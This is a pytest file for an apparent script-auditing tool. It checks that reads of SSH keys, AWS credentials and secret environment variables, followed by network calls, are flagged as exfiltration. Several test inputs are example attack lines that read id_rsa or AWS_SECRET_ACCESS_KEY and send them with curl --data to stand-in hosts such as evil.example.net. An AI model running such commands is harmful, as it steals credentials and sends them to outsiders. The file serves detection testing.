"""Secret reads and the exfiltration shape: secrets read, then network."""

import pytest

from frostlang.audit import find_dangers, verdict, check, parse_policy

from helpers import caps_for, dangers_for, titles, example, example_names


def test_secret_path_behind_a_variable_prefix_is_caught():
    # The path is never a whole literal; only the ".ssh/id_rsa" tail is.
    src = '''
    put the environment variable "HOME" into home
    put file (home & "/.ssh/id_rsa") into key
    '''
    assert any("credentials" in t.lower() for t in titles(src))


def test_literal_secret_path_still_caught():
    assert any("credentials" in t.lower()
               for t in titles('put file "/home/me/.aws/credentials" into k'))


def test_pem_and_key_files_are_secrets():
    assert any("credentials" in t.lower()
               for t in titles('put file "server.pem" into cert'))


def test_ordinary_file_read_is_not_a_secret():
    assert not any("credentials" in t.lower()
                   for t in titles('put file "notes.txt" into n'))


def test_secret_env_var_is_flagged():
    src = 'put the environment variable "GITHUB_TOKEN" into t'
    assert any("secret from the environment" in t for t in titles(src))


def test_ordinary_env_var_is_not_flagged():
    src = 'put the environment variable "HOME" into h'
    assert not any("secret" in t.lower() for t in titles(src))


def test_exfiltration_pattern_is_the_headline_finding():
    src = '''
    put file "/home/me/.ssh/id_rsa" into key
    try to run "curl" with "--data", key, "https://evil.example.net" within 5 seconds
    '''
    f = dangers_for(src)
    assert any(x.severity == "danger" and "Secrets read" in x.title for x in f)


def test_secrets_without_network_is_not_exfiltration():
    # Reading a key to use it locally is normal; no theft finding.
    src = 'put file "/home/me/.ssh/id_rsa" into key\nput the length of key'
    assert not any("Secrets read, then" in t for t in titles(src))


def test_network_without_secrets_is_not_exfiltration():
    src = 'run "curl" with "https://example.com" within 5 seconds'
    assert not any("Secrets read, then" in t for t in titles(src))


def test_env_secret_plus_network_is_exfiltration():
    src = '''
    put the environment variable "AWS_SECRET_ACCESS_KEY" into k
    try to run "curl" with "--data", k, "https://x.example" within 5 seconds
    '''
    assert any("Secrets read, then" in t for t in titles(src))


def test_the_four_demo_scripts_land_as_intended():
    """The audit page depends on these staying put."""
    rules = parse_policy(example("production.policy"))
    expected = {"exfiltrate.frost": "blocked",
                "danger.frost": "blocked",
                "healthcheck.frost": "clean",
                "logreport.frost": "clean"}
    for name, want in expected.items():
        caps = caps_for(example(name))
        got = verdict(find_dangers(caps), check(caps, rules))
        assert got == want, f"{name}: expected {want}, got {got}"


@pytest.mark.parametrize("name", example_names())
def test_no_benign_script_reports_exfiltration(name):
    if name == "exfiltrate.frost":
        pytest.skip("this one is meant to exfiltrate")
    assert not any("Secrets read, then" in f.title
                   for f in dangers_for(example(name))), name
